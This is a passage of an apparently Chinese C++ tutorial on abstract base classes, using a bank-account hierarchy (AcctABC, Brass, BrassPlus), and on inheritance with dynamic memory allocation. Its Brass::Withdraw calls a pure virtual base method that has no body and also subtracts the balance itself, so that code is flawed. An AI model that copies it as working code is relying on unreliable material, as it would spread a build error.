class="keyword">double</span> ml = <span class="number">500</span>,</span><br><span class="line">              <span class="keyword">double</span> r = <span class="number">0.11125</span>);</span><br><span class="line">    BrassPlus(<span class="keyword">const</span> Brass &amp; ba, <span class="keyword">double</span> ml = <span class="number">500</span>, <span class="keyword">double</span> r = <span class="number">0.11125</span>);</span><br><span class="line">    <span class="comment">// 实现基类的纯虚函数 Withdraw</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// 实现基类的纯虚函数 ViewAcct</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// 派生类自己的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetMax</span><span class="params">(<span class="keyword">double</span> m)</span> </span>&#123; maxLoan = m; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRate</span><span class="params">(<span class="keyword">double</span> r)</span> </span>&#123; rate = r; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetOwes</span><span class="params">()</span> </span>&#123; owesBank = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~BrassPlus() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// ACCTABC_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>acctabc.cpp (实现)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;acctabc.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ios_base;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- AcctABC 方法实现 ---</span></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line">AcctABC::AcctABC(<span class="keyword">const</span> <span class="built_in">string</span> &amp; s, <span class="keyword">long</span> an, <span class="keyword">double</span> bal) &#123;</span><br><span class="line">    fullName = s;</span><br><span class="line">    acctNum = an;</span><br><span class="line">    balance = bal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存款 (非虚函数，所有账户类型通用)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AcctABC::Deposit</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amt &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Negative deposit not allowed; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;deposit is cancelled.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        balance += amt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：纯虚函数 Withdraw() 和 ViewAcct() 在基类中没有实现体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助格式化函数</span></span><br><span class="line"><span class="function">AcctABC::Formatting <span class="title">AcctABC::SetFormat</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Formatting f;</span><br><span class="line">    f.flag = <span class="built_in">cout</span>.setf(ios_base::fixed, ios_base::floatfield); <span class="comment">// use fixed-point</span></span><br><span class="line">    f.pr = <span class="built_in">cout</span>.precision(<span class="number">2</span>); <span class="comment">// for $$$.cc format</span></span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AcctABC::Restore</span><span class="params">(Formatting &amp; f)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>.setf(f.flag, ios_base::floatfield);</span><br><span class="line">    <span class="built_in">cout</span>.precision(f.pr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Brass 方法实现 ---</span></span><br><span class="line"><span class="comment">// 实现纯虚函数 Withdraw</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Brass::Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Withdrawal amount must be positive; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;withdrawal canceled.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (amt &lt;= Balance()) &#123; <span class="comment">// 使用基类的 Balance() 方法</span></span><br><span class="line">        AcctABC::Withdraw(amt); <span class="comment">// 调用基类版本来更新余额 (如果基类有实现的话，这里假设基类没实现，直接修改)</span></span><br><span class="line">        balance -= amt;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Withdrawal amount of $&quot;</span> &lt;&lt; amt</span><br><span class="line">             &lt;&lt; <span class="string">&quot; exceeds your balance.\n&quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;Withdrawal canceled.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现纯虚函数 ViewAcct</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Brass::ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Formatting f = SetFormat(); <span class="comment">// 使用基类的格式化辅助函数</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Brass Client: &quot;</span> &lt;&lt; FullName() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 使用基类的 protected 方法</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Account Number: &quot;</span> &lt;&lt; AcctNum() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 使用基类的 protected 方法</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: $&quot;</span> &lt;&lt; Balance() &lt;&lt; <span class="built_in">endl</span>;     <span class="comment">// 使用基类的 public 方法</span></span><br><span class="line">    Restore(f); <span class="comment">// 恢复格式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- BrassPlus 方法实现 ---</span></span><br><span class="line">BrassPlus::BrassPlus(<span class="keyword">const</span> <span class="built_in">string</span> &amp; s, <span class="keyword">long</span> an, <span class="keyword">double</span> bal,</span><br><span class="line">                     <span class="keyword">double</span> ml, <span class="keyword">double</span> r) : AcctABC(s, an, bal) &#123;</span><br><span class="line">    maxLoan = ml;</span><br><span class="line">    owesBank = <span class="number">0.0</span>;</span><br><span class="line">    rate = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BrassPlus::BrassPlus(<span class="keyword">const</span> Brass &amp; ba, <span class="keyword">double</span> ml, <span class="keyword">double</span> r)</span><br><span class="line">           : AcctABC(ba) &#123; <span class="comment">// 使用 AcctABC 的隐式复制构造函数 (如果存在且可用)</span></span><br><span class="line">                           <span class="comment">// 或者显式调用 AcctABC(ba.FullName(), ba.AcctNum(), ba.Balance())</span></span><br><span class="line">                           <span class="comment">// (需要 ba 提供访问器或 AcctABC 成员是 protected)</span></span><br><span class="line">    maxLoan = ml;</span><br><span class="line">    owesBank = <span class="number">0.0</span>;</span><br><span class="line">    rate = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现纯虚函数 ViewAcct</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BrassPlus::ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Formatting f = SetFormat();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BrassPlus Client: &quot;</span> &lt;&lt; FullName() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Account Number: &quot;</span> &lt;&lt; AcctNum() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: $&quot;</span> &lt;&lt; Balance() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum loan: $&quot;</span> &lt;&lt; maxLoan &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Owed to bank: $&quot;</span> &lt;&lt; owesBank &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loan Rate: &quot;</span> &lt;&lt; <span class="number">100</span> * rate &lt;&lt; <span class="string">&quot;%\n&quot;</span>;</span><br><span class="line">    Restore(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现纯虚函数 Withdraw</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BrassPlus::Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Withdrawal amount must be positive; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;withdrawal canceled.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Formatting f = SetFormat();</span><br><span class="line">    <span class="keyword">double</span> bal = Balance(); <span class="comment">// 获取当前余额</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (amt &lt;= bal) &#123; <span class="comment">// 如果余额足够</span></span><br><span class="line">        <span class="comment">// 调用基类的 Withdraw (如果它修改余额) 或直接修改</span></span><br><span class="line">        <span class="comment">// 假设 balance 是 protected:</span></span><br><span class="line">        balance -= amt;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (amt &lt;= bal + maxLoan - owesBank) &#123; <span class="comment">// 如果余额+剩余可透支额度足够</span></span><br><span class="line">        <span class="keyword">double</span> advance = amt - bal; <span class="comment">// 需要透支的金额</span></span><br><span class="line">        owesBank += advance * (<span class="number">1.0</span> + rate); <span class="comment">// 计算欠款 (加上利息)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bank advance: $&quot;</span> &lt;&lt; advance &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Finance charge: $&quot;</span> &lt;&lt; advance * rate &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        Deposit(advance); <span class="comment">// 先存入透支额度 (增加余额)</span></span><br><span class="line">        <span class="comment">// 再取款 (修改余额)</span></span><br><span class="line">        <span class="comment">// 假设 balance 是 protected:</span></span><br><span class="line">        balance -= amt;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Credit limit exceeded. Transaction cancelled.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Restore(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用示例 (usebrass1.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;acctabc.h&quot;</span> <span class="comment">// 包含 ABC 和派生类</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CLIENTS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AcctABC anAccount; // 错误！不能创建抽象基类对象</span></span><br><span class="line"></span><br><span class="line">    AcctABC * p_clients[CLIENTS]; <span class="comment">// 可以创建指向 ABC 的指针数组</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> temp;</span><br><span class="line">    <span class="keyword">long</span> tempnum;</span><br><span class="line">    <span class="keyword">double</span> tempbal;</span><br><span class="line">    <span class="keyword">char</span> kind;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTS; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter client&#x27;s name: &quot;</span>;</span><br><span class="line">        getline(<span class="built_in">cin</span>, temp);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter client&#x27;s account number: &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; tempnum;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter opening balance: $&quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; tempbal;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter 1 for Brass Account or &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;2 for BrassPlus Account: &quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; kind &amp;&amp; (kind != <span class="string">&#x27;1&#x27;</span> &amp;&amp; kind != <span class="string">&#x27;2&#x27;</span>))</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter either 1 or 2: &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kind == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            p_clients[i] = <span class="keyword">new</span> Brass(temp, tempnum, tempbal);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">double</span> tmax, trate;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the overdraft limit: $&quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; tmax;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the interest rate &quot;</span></span><br><span class="line">                 &lt;&lt; <span class="string">&quot;as a decimal fraction: &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; trate;</span><br><span class="line">            p_clients[i] = <span class="keyword">new</span> BrassPlus(temp, tempnum, tempbal, tmax, trate);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// 清除行尾换行符</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用多态性处理不同类型的账户</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTS; i++) &#123;</span><br><span class="line">        p_clients[i]-&gt;ViewAcct(); <span class="comment">// 调用虚函数 ViewAcct()</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTS; i++) &#123;</span><br><span class="line">        <span class="keyword">delete</span> p_clients[i]; <span class="comment">// 调用虚析构函数，确保正确的析构函数被调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 假设 acctabc.h 中 balance 已移至 protected</span></span><br><span class="line">g++ usebrass1.cpp acctabc.cpp -o usebrass1</span><br><span class="line">./usebrass1</span><br></pre></td></tr></table></figure><p>程序会提示输入客户信息，创建不同类型的账户对象，然后通过基类指针数组 <code>p_clients</code> 多态地调用 <code>ViewAcct()</code> 方法，显示每个账户的信息。最后，通过 <code>delete p_clients[i]</code> 安全地销毁对象，因为 <code>~AcctABC()</code> 是虚析构函数。</p><h3 id="13-6-2-ABC-理念"><a href="#13-6-2-ABC-理念" class="headerlink" title="13.6.2 ABC 理念"></a>13.6.2 ABC 理念</h3><p>抽象基类的核心理念是<strong>接口与实现分离</strong>。</p><ul><li>  <strong>接口:</strong> ABC 定义了一个通用的接口（通过纯虚函数和可能的非虚函数），规定了派生类应该具有哪些功能。</li><li>  <strong>实现:</strong> 具体的派生类负责提供这些功能的具体实现。</li></ul><p>使用 ABC 的好处：</p><ol><li> <strong>强制接口统一:</strong> 确保所有相关的派生类都遵循一个共同的接口规范。</li><li> <strong>实现多态:</strong> 允许通过基类指针或引用来统一处理不同派生类的对象，调用它们各自实现的虚函数版本。</li><li> <strong>代码可扩展性:</strong> 当需要添加新的账户类型（例如 <code>SavingsAccount</code>）时，只需从 <code>AcctABC</code> 派生并实现其纯虚函数即可，现有使用 <code>AcctABC*</code> 的代码（如 <code>main</code> 函数中的循环）通常无需修改就能处理新的账户类型。</li><li> <strong>清晰的设计:</strong> 更好地模拟现实世界中的抽象概念和层次关系。</li></ol><p>ABC 是 C++ 中实现抽象和多态的关键工具，对于设计灵活、可维护的面向对象系统非常重要。</p><h2 id="13-7-继承和动态内存分配"><a href="#13-7-继承和动态内存分配" class="headerlink" title="13.7 继承和动态内存分配"></a>13.7 继承和动态内存分配</h2><p>当继承与动态内存分配（使用 <code>new</code> 和 <code>delete</code>）结合时，我们需要特别注意析构函数、复制构造函数和赋值运算符的行为，以确保资源的正确管理。主要有两种情况：</p><h3 id="13-7-1-第一种情况：派生类不使用-new"><a href="#13-7-1-第一种情况：派生类不使用-new" class="headerlink" title="13.7.1 第一种情况：派生类不使用 new"></a>13.7.1 第一种情况：派生类不使用 <code>new</code></h3><p>如果基类使用了动态内存分配（因此需要自定义析构函数、复制构造函数、赋值运算符），而派生类<strong>没有</strong>使用 <code>new</code> 来分配自己的动态内存，情况相对简单。</p><ul><li><p><strong>析构函数:</strong></p><ul><li>  派生类不需要显式定义析构函数来释放内存（因为它没有分配）。</li><li>  当派生类对象被销毁时，会先执行派生类的析构函数（即使是编译器生成的默认版本），然后<strong>自动</strong>调用基类的析构函数。</li><li>  <strong>关键:</strong> 为了能通过基类指针 <code>delete</code> 派生类对象，基类的析构函数<strong>必须</strong>声明为 <code>virtual</code>。如果基类析构函数是虚函数，那么 <code>delete basePtr;</code> (其中 <code>basePtr</code> 指向派生类对象) 会先调用派生类的析构函数，再调用基类的析构函数，确保所有资源被正确释放。</li></ul></li><li><p><strong>复制构造函数:</strong></p><ul><li>  派生类的默认复制构造函数会执行成员逐一复制。对于继承自基类的部分，它会自动调用<strong>基类的复制构造函数</strong>。</li><li>  因此，如果基类的复制构造函数正确实现了深复制，那么派生类对象的基类部分也会被正确地深复制。派生类自身的成员（非动态分配）会被正常复制。</li></ul></li><li><p><strong>赋值运算符:</strong></p><ul><li>  派生类的默认赋值运算符会执行成员逐一赋值。对于继承自基类的部分，它会自动调用<strong>基类的赋值运算符</strong>。</li><li>  因此，如果基类的赋值运算符正确实现了深复制（包括处理自我赋值和释放旧内存），那么派生类对象的基类部分也会被正确地赋值。</li></ul></li></ul><p><strong>结论:</strong> 如果基类正确地管理了它的动态内存（遵循三/五法则，特别是使用虚析构函数），并且派生类没有引入新的动态内存管理需求，那么派生类通常不需要显式定义这些特殊的成员函数。</p><p><strong>示例 (baseDMA 和 lacksDMA):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dma.h -- 继承和动态内存分配</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DMA_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMA_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态内存分配的基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baseDMA</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * label;</span><br><span class="line">    <span class="keyword">int</span> rating;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    baseDMA(<span class="keyword">const</span> <span class="keyword">char</span> * l = <span class="string">&quot;null&quot;</span>, <span class="keyword">int</span> r = <span class="number">0</span>);</span><br><span class="line">    baseDMA(<span class="keyword">const</span> baseDMA &amp; rs); <span class="comment">// 复制构造函数</span></span><br><span class="line">    <span class="keyword">virtual</span> ~baseDMA(); <span class="comment">// 虚析构函数</span></span><br><span class="line">    baseDMA &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> baseDMA &amp; rs); <span class="comment">// 赋值运算符</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> baseDMA &amp; rs);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 派生类 - 不使用 new</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lacksDMA</span> :</span> <span class="keyword">public</span> baseDMA &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span 